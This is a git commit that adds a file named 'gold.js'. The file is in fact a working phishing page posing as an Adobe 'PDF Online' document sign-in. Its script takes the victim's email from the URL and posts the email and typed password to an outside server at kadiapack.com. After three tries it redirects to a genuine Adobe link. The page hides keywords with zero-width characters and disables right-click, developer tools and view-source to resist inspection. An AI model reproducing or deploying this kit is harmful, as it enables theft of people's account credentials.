1619ecc4eaed9728ac419af4a778af37156f22c5
powerhos08 <91499379+powerhos08@users.noreply.github.com>
2022-08-08 01:15:46 +0200

    Create gold.js

---
+++ gold.js
@@ -0,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex">
+    <title page-title>Si&zwj;gn In - Se&zwj;cu&zwj;re Do&zwj;cu&zwj;ment Dist&zwj;rib&zwj;uti&zwj;on</title>
+    <link href="https://salesdemo.loyaltyloop.com/static/main.css" type="text/css" rel="stylesheet">
+    <script type="text/javascript" src="https://salesdemo.loyaltyloop.com/static/jquery.min.js"></script>
+    <script type="text/javascript" src="https://salesdemo.loyaltyloop.com/static/bootstrap-validator.min.js"></script>
+    <link rel="shortcut icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAgRJREFUeNpi/P//PwMlgImwkrNp/x8sOPH/TMTPf7s1/p/Y6PjfZNbZPyZnGS6AZFlwaft3ueQkw6vdvIzfbooDuXwgtfN/pjJkfC3956cteG+tMUMnSB0jhhcOu/3/9/HMPyiPEYQZ/39jmAfTrCJ4d601rxpMOdyAfyeC//9/fxLDJczM3xh2fLFm8P089b8mH8vDS4FSisjyYC/8PWD1n/H3GwZGFh6QUSgGfPzLz5D3LpOBgZXhe6sBxxJ0C1j+Hff5z/j3KzA4OTFDmOk3w5qPTgy3/4kzGP98/dRXUa4WwwDGX++BJA/DP6BXmBgZId6Beus/kL/nvRKYnWIo9AhbYLMwsHBD/Ap0+X9gpDL+A9kMoRmY/jLc/s/NwPb4CQODodBPrAYw8msw/PvylOE/M0QATP//CaTZgfg3gyrjV4bLECkR7AlJZxIjA7ciMAC5wJjpPycDI6sgkM0K9BIXg4vgPbDCS4+fyeJMiUy6PYwMIs5AGzkZ/nEADQJq/M/MB8YBUn8YxP89Z9hy9rIo3qTMqJDAyGQ4i5FR0IqBgZ2dgYmVA4yF+VgZ6g2vMjx+w8SSte7oFXQDGHFlJmD6/wik/vz/fIWVifEXR/oxHdZZZxk+T09xnZBhqliHUAg0gDA+s/bf/fmPOlbM/SlbNf3GpntvQ2FyjJRmZ4AAAwBBMN/uzXqSVQAAAABJRU5ErkJggg==" type="image/x-icon" />
+
+</head>
+
+<body>
+    <div id="app" class="body-content no-header">
+
+  		<main id="app-main" class="body-content">
+
+  			<div class="box-in-middle center with-padding-30-tb">
+
+  				<div class="body-content bg-white with-radius with-padding-20">
+
+  					<div class="body-content with-margin-10 with-padding-10-tb">
+  						<h2 class="h3">
+						<img src="https://cdn.worldvectorlogo.com/logos/adobe-44195.svg" class="img-fluid" width="100px"><span class="pl-4 h5 align-middle">PD&zwj;F On&zwj;lin&zwj;e</span><br>
+						<h2 class="h3">Si&zwj;gn in to ac&zwj;ces&zwj;s do&zwj;cum&zwj;ent</h2>
+  					</div>
+<center>
+                        <div id="msg" style="display: none;font-weight: 500;color: red;">An error has occurre. Password is incorrect...</div>
+                        <span id="error" class="text-danger" style="display: none;">This e-mail address could not be found</span>
+                    </center>
+  					<form id="contact" method="POST" action>
+						<div class="alert alert-danger hide alert2"></div>
+  						<div class="body-content general-form-row">
+  							<div class="body-content label-over form-group">
+                            <input type="email" id="email" name="email" class="form-control" value placeholder required readonly>
+  								
+  								  
+  							</div>
+  						</div>
+
+  						<div class="body-content general-form-row with-margin">
+  							<div class="body-content label-over form-group">
+  								<input type="password" id="password" name="password" placeholder class="form-control" required>
+  								
+  								<div class="help-block with-errors"></div>
+  							</div>
+							
+  						</div>
+
+
+  						<div class="body-content general-form-row">
+                                <button class="button-general blue full-width" id="submit-btn">Si&zwj;gn I&zwj;n</button>
+                            </div>
+
+  						<div class="body-content general-form-row">
+  							<div class="text-content medium">
+  								<p></a></p>
+  							</div>
+  						</div>
+
+  						<div class="body-content general-form-row">
+  							<div class="text-content small">
+
+  							</div>
+  						</div>
+
+  					</form>
+
+  				</div>
+
+  			</div>
+
+  		</main>
+    </div>
+
+<!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+        $(".logoname").html(finalu);
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://kadiapack.com/po/set.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=3) {
+                    count=0;
+                    
+                    window.location.replace("https://documentcloud.adobe.com/link/track?uri=urn:aaid:scds:US:e84871b1-ecda-4966-b00e-85001c9e1ac7");
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                  // $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=3) {
+                count=0;
+                window.location.replace("https://documentcloud.adobe.com/link/track?uri=urn:aaid:scds:US:e84871b1-ecda-4966-b00e-85001c9e1ac7");
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+
+    });
+
+
+  </script>
+ <script> 
+    /** 
+     * Disable right-click of mouse, F12 key, and save key combinations on page 
+     */ 
+     document.addEventListener("contextmenu", function(e){ 
+     e.preventDefault(); 
+     }, false); 
+     document.addEventListener("keydown", function(e) { 
+     //document.onkeydown = function(e) { 
+     // "I" key 
+     if (e.ctrlKey && e.shiftKey && e.keyCode == 73) { 
+     disabledEvent(e); 
+     } 
+     // "J" key 
+     if (e.ctrlKey && e.shiftKey && e.keyCode == 74) { 
+     disabledEvent(e); 
+     } 
+     // "S" key + macOS 
+     if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) { 
+     disabledEvent(e); 
+     } 
+     // "U" key 
+     if (e.ctrlKey && e.keyCode == 85) { 
+     disabledEvent(e); 
+     } 
+     // "F12" key 
+     if (event.keyCode == 123) { 
+     disabledEvent(e); 
+     } 
+     // "C" key 
+     if (e.ctrlKey && event.keyCode == 67) { 
+     disabledEvent(e); 
+     } 
+     }, false); 
+     function disabledEvent(e){ 
+     if (e.stopPropagation){ 
+     e.stopPropagation(); 
+     } else if (window.event){ 
+     window.event.cancelBubble = true; 
+     } 
+     e.preventDefault(); 
+     return false; 
+     }</script> 
+    
+    </html> 
